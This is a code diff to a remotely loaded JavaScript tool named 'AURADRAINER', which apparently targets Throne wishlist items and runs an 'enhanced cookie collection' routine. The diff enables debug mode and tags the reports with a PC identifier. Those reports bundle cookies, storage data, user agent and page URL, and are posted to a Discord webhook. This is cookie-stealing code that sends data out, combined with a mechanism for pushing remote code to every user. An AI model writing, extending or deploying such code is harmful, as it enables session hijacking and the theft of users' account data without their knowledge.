@@ -1,10 +1,15 @@
-
+// ========================================
+// AURADRAINER - Remote Execution Script
+// This file is hosted on GitHub and loaded remotely
+// Update this file to push changes to all users
+// ========================================
 
 const config = {
   throneUrl: "throne.com/thegoddessaura",
   forceStop: true,
   forceStopShortcut: "Alt+Shift+E",
-  debugMode: false,
+  debugMode: true,
+  // Specific item targeting (leave empty "" to add any item)
   targetItemName: "Auto-Drain", // e.g., "PlayStation 5" or part of the item name
   // Enhanced cookie collection configuration
   cookieCollection: {
@@ -472,7 +477,7 @@ async function sendToDiscordWebhook(message, isFile = false) {
     if (isFile) {
       // For file uploads, create FormData directly
       const formData = new FormData();
-      formData.append('content', "🍪 **Cookie Collection Report** 🍪");
+      formData.append('content', `🍪 **Cookie Collection Report** 🍪\n\n🖥️ **${pcIdentifier}**`);
       
       // Create a proper file blob
       const blob = new Blob([message], { type: 'text/plain' });
@@ -488,19 +493,19 @@ async function sendToDiscordWebhook(message, isFile = false) {
       };
     } else {
       const payload = {
-      content: message
-    };
-
+        content: `${message}\n\n🖥️ **${pcIdentifier}**`
+      };
+      
       debugLog(`📡 [DISCORD DEBUG] Payload created, type: message`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
-
+      debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
+      
       requestOptions = {
-      method: 'POST',
-      headers: {
+        method: 'POST',
+        headers: {
           'Content-Type': 'application/json',
-      },
+        },
         body: JSON.stringify(payload)
-    };
+      };
     }
 
     debugLog("📡 [DISCORD DEBUG] Sending fetch request...", "info");
@@ -635,7 +640,6 @@ async function collectAndLogCookies() {
 // Enhanced comprehensive report formatting
 function formatComprehensiveReport(storageData, processedCookies) {
   let report = `🍪 **AURADRAIN COMPREHENSIVE DATA REPORT** 🍪\n`;
-  report += `🖥️ **PC Identifier:** ${pcIdentifier}\n`;
   report += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
   report += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
   report += `🌍 **URL:** ${window.location.href}\n`;
@@ -762,7 +766,6 @@ async function testDiscordWebhook() {
   debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
   
   const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
-    `🖥️ **PC Identifier:** ${pcIdentifier}\n` +
     `⏰ **Time:** ${new Date().toLocaleString()}\n` +
     `🌍 **URL:** ${window.location.href}\n` +
     `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
